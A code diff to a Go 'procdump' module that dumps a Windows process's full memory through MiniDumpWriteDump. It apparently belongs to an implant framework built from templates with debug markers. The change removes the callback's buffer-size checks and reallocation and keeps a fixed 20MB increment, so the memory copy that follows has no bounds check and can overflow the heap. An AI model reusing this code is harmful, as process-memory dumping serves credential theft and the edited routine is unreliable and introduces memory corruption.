@@ -20,6 +20,7 @@ package procdump
 
 import (
 	"fmt"
+
 	//{{if .Config.Debug}}
 	"log"
 	//{{end}}
@@ -66,7 +67,7 @@ const (
 	S_OK                   = 0
 	TRUE                   = 1
 	FALSE                  = 0
-	IncrementSize          = 5 * 1024 * 1024
+	IncrementSize          = 20 * 1024 * 1024 // Add 20MB just to be safe
 	MiniDumpWithFullMemory = 0x00000002
 )
 
@@ -171,9 +172,6 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	)
 
 	if err != nil {
-		//{{if .Config.Debug}}
-		log.Println("Minidump syscall failed:", err)
-		//{{end}}
 		return dump, err
 	}
 	outBuff := make([]byte, outData.bytesRead)
@@ -267,42 +265,15 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 		// {{end}}
 		return FALSE
 	}
+	// {{if .Config.Debug}}
+	log.Printf("minidumpCallback called: %v\n", callbackInput.CallbackType)
+	// {{end}}
 	switch callbackInput.CallbackType {
 	case IoStartCallback:
 		callbackOutput.Status = S_FALSE
 	case IoWriteAllCallback:
 		callbackOutput.Status = S_OK
 		outData := (*outDump)(unsafe.Pointer(callbackParam))
-		procHeap, err := syscalls.GetProcessHeap()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("minidumpCallback GetProcessHeap failed: %s\n", err.Error())
-			// {{end}}
-			return FALSE
-		}
-		currentBuffSize, err := syscalls.HeapSize(procHeap, 0, outData.outPtr)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
-			// {{end}}
-			return FALSE
-		}
-		bytesAndOffset := callbackInput.Io.Offset + uint64(callbackInput.Io.BufferBytes)
-		if bytesAndOffset >= uint64(currentBuffSize) {
-			increasedSize := IncrementSize
-			if bytesAndOffset <= uint64(currentBuffSize*2) {
-				increasedSize = int(currentBuffSize) * 2
-			} else {
-				increasedSize += int(bytesAndOffset)
-			}
-			outData.outPtr, err = syscalls.HeapReAlloc(procHeap, 0, outData.outPtr, uintptr(increasedSize))
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
-				// {{end}}
-				return FALSE
-			}
-		}
 		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
 		syscalls.RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
 		outData.bytesRead += callbackInput.Io.BufferBytes
